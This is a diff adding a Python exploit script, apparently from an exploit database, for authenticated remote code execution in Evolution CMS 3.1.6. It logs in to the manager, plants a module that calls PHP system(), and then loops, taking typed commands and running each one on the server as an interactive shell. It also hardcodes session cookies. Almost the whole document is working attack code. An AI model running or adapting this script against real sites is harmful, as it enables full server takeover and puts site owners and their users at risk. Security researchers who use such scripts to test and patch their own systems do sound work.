@@ -1,0 +1,273 @@
+# Exploit Title: Evolution CMS 3.1.6 - Remote Code Execution (RCE) (Authenticated)
+# Date: 15-09-2021
+# Exploit Author: Halit AKAYDIN (hLtAkydn)
+# Vendor Homepage: https://evo.im/
+# Software Link: https://github.com/evolution-cms/evolution/releases
+# Version: 3.1.6
+# Category: Webapps
+# Tested on: Linux/Windows
+
+
+# Example: python3 exploit.py -u http://example.com -l admin -p Admin123
+#	   python3 exploit.py -h
+
+
+from bs4 import BeautifulSoup
+from time import sleep
+import requests
+import argparse
+import sys
+
+def main():
+	parser = argparse.ArgumentParser(description='Evolution CMS 3.1.6 - Remote Code Execution (RCE) (Authenticated)')
+	parser.add_argument('-u', '--host', type=str, required=True)
+	parser.add_argument('-l', '--login', type=str, required=True)
+	parser.add_argument('-p', '--password', type=str, required=True)
+	args = parser.parse_args()
+	print("\nEvolution CMS 3.1.6 - Remote Code Execution (RCE) (Authenticated)",
+		  "\nExploit Author: Halit AKAYDIN (hLtAkydn)\n")
+	sleep(2)
+	exploit(args)
+
+def exploit(args):
+
+	#Check http or https
+	if args.host.startswith(('http://', 'https://')):
+		print("[?] Check Url...\n")
+		args.host = args.host
+		if args.host.endswith('/'):
+			args.host = args.host[:-1]
+		sleep(2)
+	else:
+		print("\n[?] Check Adress...\n")
+		args.host = "http://" + args.host
+		args.host = args.host
+		if args.host.endswith('/'):
+			args.host = args.host[:-1]
+		sleep(2)
+
+	# Check Host Status
+	try:
+		response = requests.get(args.host)
+		if response.status_code != 200:
+			print("[-] Address not reachable!")
+			sleep(2)
+			exit(1)
+
+	except requests.ConnectionError as exception:
+		print("[-] Address not reachable!")
+		sleep(2)
+		exit(1)
+
+
+	# Login and cookie set
+	session = requests.session()
+	url = args.host + "/manager/?a=0"
+	cookies = {
+		"mybb[lastvisit]": "1631537273",
+		"loginattempts": "1",
+		"mybb[lastactive]": "1631537588",
+		"mybbuser": "2_IFsbw9XQFguv1DM0ygBdbkeg3v0zmQPpW6it5MjHev7gz3nkNn",
+		"evo_session": "Kp9j1QushJrXYwhHiHS1dqntLiTnTiBQ25ZUDndq",
+		"KCFINDER_showname": "on",
+		"KCFINDER_showsize": "off",
+		"KCFINDER_showtime": "off",
+		"KCFINDER_order": "name",
+		"KCFINDER_orderDesc": "off",
+		"KCFINDER_view": "thumbs",
+		"KCFINDER_displaySettings": "off",
+		"evoq28fzr": "o0hd9im6q76pptjcsjeaa693os"
+	}
+
+	headers = {
+		"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0",
+		"Content-Type": "application/x-www-form-urlencoded;",
+		"Accept": "*/*",
+		"Origin": args.host,
+		"Referer": args.host + "/manager/",
+		"Accept-Encoding": "gzip, deflate",
+		"Accept-Language": "en-US,en;q=0.9",
+		"Connection": "close"
+	}
+
+	data = {
+		"ajax": "1",
+		"username": args.login,
+		"password": args.password,
+		"rememberme": "1"
+	}
+
+	response = session.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
+	new_cookie = response.cookies.get("evoq28fzr")
+	user_role = response.cookies.get("modx_remember_manager")
+
+	if user_role is None:
+		print("[-] Login Failed!\n")
+		print("[*]",response.text)
+		sleep(2)
+		exit(1)
+	else:
+		print("[+] Login Success!\n")
+		sleep(2)
+		print("[!] Login User", user_role,"\n")
+		sleep(2)
+
+
+	# User authorization check
+	url = args.host + "/manager/index.php"
+	cookies = {
+		"mybb[lastvisit]": "1631537273",
+		"loginattempts": "1",
+		"mybb[lastactive]": "1631537588",
+		"mybbuser": "2_IFsbw9XQFguv1DM0ygBdbkeg3v0zmQPpW6it5MjHev7gz3nkNn",
+		 "evo_session": "Kp9j1QushJrXYwhHiHS1dqntLiTnTiBQ25ZUDndq",
+		 "KCFINDER_showname": "on",
+		 "KCFINDER_showsize": "off",
+		 "KCFINDER_showtime": "off",
+		 "KCFINDER_order": "name",
+		 "KCFINDER_orderDesc": "off",
+		 "KCFINDER_view": "thumbs",
+		 "KCFINDER_displaySettings": "off",
+		 "webfxtab_modulePane": "0",
+		 "evoq28fzr": new_cookie,
+	}
+
+	headers = {
+		"Cache-Control": "max-age=0",
+		"Upgrade-Insecure-Requests": "1",
+		"Origin": args.host,
+		"Content-Type": "application/x-www-form-urlencoded",
+		"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0",
+		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+		"Referer": args.host + "/manager/index.php?a=108&id=1",
+		"Accept-Encoding": "gzip, deflate",
+		"Accept-Language": "en-US,en;q=0.9",
+		"Connection": "close"
+	}
+	data = {
+		"a": "109",
+		"id": "1",
+		"mode": "108",
+		"stay": "2",
+		"name": "rce",
+		"description": "<strong>0.1.3</strong> first repository for Evolution CMS ",
+		"categoryid": "1",
+		"newcategory": '',
+		"icon": '',
+		"resourcefile": '',
+		"post": "system('whoami');",
+		"guid": "8d4669cac3afd1f59d416f11eadf3355",
+		"properties": "{}",
+		"chkallgroups": "on",
+		"save": "Submit"
+	}
+
+	response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
+	soup = BeautifulSoup(response.text, 'html.parser')
+
+	if soup.find_all("title")[0].text == "My Evolution Site (Evolution CMS Manager Login)":
+		print("[!] Unauthorized user\n\n")
+		print("User with module creation permissions is required.")
+		exit(1)
+	elif soup.find_all("p")[0].text == "You don't have enough privileges for this action!":
+		print("[!] Unauthorized user\n\n")
+		print("User with module creation permissions is required.")
+		exit(1)
+	else:
+		print ("[+] Exploit Done!\n")
+		sleep(2)
+		pass
+
+	while True:
+		cmd = input("$ ")
+
+		# Update Modules
+		url = args.host + "/manager/index.php"
+		cookies = {
+			"mybb[lastvisit]": "1631537273",
+			"loginattempts": "1",
+			"mybb[lastactive]": "1631537588",
+			"mybbuser": "2_IFsbw9XQFguv1DM0ygBdbkeg3v0zmQPpW6it5MjHev7gz3nkNn",
+			 "evo_session": "Kp9j1QushJrXYwhHiHS1dqntLiTnTiBQ25ZUDndq",
+			 "KCFINDER_showname": "on",
+			 "KCFINDER_showsize": "off",
+			 "KCFINDER_showtime": "off",
+			 "KCFINDER_order": "name",
+			 "KCFINDER_orderDesc": "off",
+			 "KCFINDER_view": "thumbs",
+			 "KCFINDER_displaySettings": "off",
+			 "webfxtab_modulePane": "0",
+			 "evoq28fzr": new_cookie,
+		}
+
+		headers = {
+			"Cache-Control": "max-age=0",
+			"Upgrade-Insecure-Requests": "1",
+			"Origin": args.host,
+			"Content-Type": "application/x-www-form-urlencoded",
+			"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0",
+			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+			"Referer": args.host + "/manager/index.php?a=108&id=1",
+			"Accept-Encoding": "gzip, deflate",
+			"Accept-Language": "en-US,en;q=0.9",
+			"Connection": "close"
+		}
+
+		data = {
+			"a": "109",
+			"id": "1",
+			"mode": "108",
+			"stay": "2",
+			"name": "rce",
+			"description": "<strong>0.1.3</strong> first repository for Evolution CMS ",
+			"categoryid": "1",
+			"newcategory": '',
+			"icon": '',
+			"resourcefile": '',
+			"post": "system('"+cmd+"');",
+			"guid": "8d4669cac3afd1f59d416f11eadf3355",
+			"properties": "{}",
+			"chkallgroups": "on",
+			"save": "Submit"
+		}
+
+		response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
+
+
+		# Run Modules
+		url = args.host + "/manager/index.php?id=1&a=112"
+		cookies = {
+			"mybb[lastvisit]": "1631537273",
+			"loginattempts": "1",
+			"mybb[lastactive]": "1631537588",
+			"mybbuser": "2_IFsbw9XQFguv1DM0ygBdbkeg3v0zmQPpW6it5MjHev7gz3nkNn",
+			"evo_session": "Kp9j1QushJrXYwhHiHS1dqntLiTnTiBQ25ZUDndq",
+			"KCFINDER_showname": "on",
+			"KCFINDER_showsize": "off",
+			"KCFINDER_showtime": "off",
+			"KCFINDER_order": "name",
+			"KCFINDER_orderDesc": "off",
+			"KCFINDER_view": "thumbs",
+			"KCFINDER_displaySettings": "off",
+			"webfxtab_modulePane": "0",
+			"evoq28fzr": new_cookie,
+		}
+
+		headers = {
+			"Upgrade-Insecure-Requests": "1",
+			"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0",
+			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+			"Referer": args.host + "/manager/index.php?a=108&id=1",
+			"Accept-Encoding": "gzip, deflate",
+			"Accept-Language": "en-US,en;q=0.9",
+			"Connection": "close"
+		}
+
+		response = requests.get(url, headers=headers, cookies=cookies, timeout=5)
+		if response.text == "":
+			print(cmd + ": command not found\n")
+		else:
+			print(response.text)
+
+if __name__ == '__main__':
+	main()
